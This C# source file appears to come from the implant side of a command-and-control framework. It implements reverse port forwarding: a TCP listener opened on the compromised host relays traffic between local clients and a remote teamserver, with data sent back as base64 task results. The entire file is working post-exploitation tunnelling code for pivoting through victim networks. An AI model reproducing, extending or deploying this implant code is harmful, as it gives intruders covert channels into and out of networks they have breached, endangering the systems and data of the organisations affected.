using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using DynamicEngLoading;
using Engineer.Functions;


namespace Engineer.Commands
{
    internal class rportForward : EngineerCommand
    {
        public override string Name => "rportforward";

        public static readonly ConcurrentDictionary<string, ConcurrentQueue<byte[]>> rPortClientData = new(); // key is the client id, queue holds data to give back to client from ts. 
        internal static CancellationTokenSource _tokenSource = new();
        
        public override async Task Execute(EngineerTask task)
        {
            //parse the bindport argument and open a tcp listener on that port
            task.Arguments.TryGetValue("/bindport", out var bindport);
            task.Arguments.TryGetValue("/client", out var client);
            bindport = bindport.TrimStart(' ');
            client = client.TrimStart(' ');
            rPortClientData.TryAdd(client, new ConcurrentQueue<byte[]>());
            Task.Run(async ()=> await HandleSendRecive(bindport,client));
            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Starting Reverse Port Forward on engineers host at port " + bindport, task, EngTaskStatus.Running,TaskResponseType.String);
        }

        private static async Task HandleSendRecive(string bindPort, string client)
        {
            try
            {
                var listener = new TcpListener(IPAddress.Any, int.Parse(bindPort));
                listener.Start();
                //while loop that handles sending and receving data while the listener is running
                while (true)
                {
                    var destination = await listener.AcceptTcpClientAsync();
                    // if destination is connected, then check the queue for data and send it to the destination
                    if (destination.Connected)
                    {
                        Console.WriteLine("Destination connected");
                        if (rPortClientData[client].TryDequeue(out var dataToRecieve))
                        {
                            Console.WriteLine("Sending data to destination");
                            await destination.SendData(dataToRecieve, _tokenSource.Token);
                        }
                        //if destionation has data to read, take it and run a rportRecieve command to send it off to the ts
                        if (destination.DataAvailable())
                        {
                            var dataToSend = await destination.ReceiveData(_tokenSource.Token);
                            //Console.WriteLine("Sending data to ts");
                            var task = new EngineerTask
                            {
                                Id = "rportsend",
                                Command = "rportsend",
                                Arguments = new Dictionary<string, string>
                            {
                                {"/client", client}
                            },
                                File = dataToSend
                            };
                            Task.Run(async () => await Tasking.DealWithTask(task));
                        }
                    }
                    await Task.Delay(10);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine(ex.StackTrace);
            }
        }
    }

    internal class rportRecieve : EngineerCommand
    {
        public override string Name => "rportRecieve";

        public override async Task Execute(EngineerTask task)
        {
            //take in data from the teamserver and send it to the client 
            task.Arguments.TryGetValue("/client", out var client);
            //try to add the client to the rPortClientData if it already exists then just add the task.File to its queue
            if (rportForward.rPortClientData.ContainsKey(client))
            {
                rportForward.rPortClientData[client].Enqueue(task.File);
            }
            else
            {
                rportForward.rPortClientData.TryAdd(client, new ConcurrentQueue<byte[]>());
                rportForward.rPortClientData[client].Enqueue(task.File);
            }
            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Data queued for client",task,EngTaskStatus.Complete,TaskResponseType.String);

        }
    }

    internal class rportSend : EngineerCommand
    {
        public override string Name => "rportsend";

        //is used to send the data to the TS from the client
        public override async Task Execute(EngineerTask task)
        {
            task.Arguments.TryGetValue("/client", out string client);
            var data = task.File;
            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(Convert.ToBase64String(data) + "\n" + client,task,EngTaskStatus.Complete,TaskResponseType.String);
        }
    }
    
}
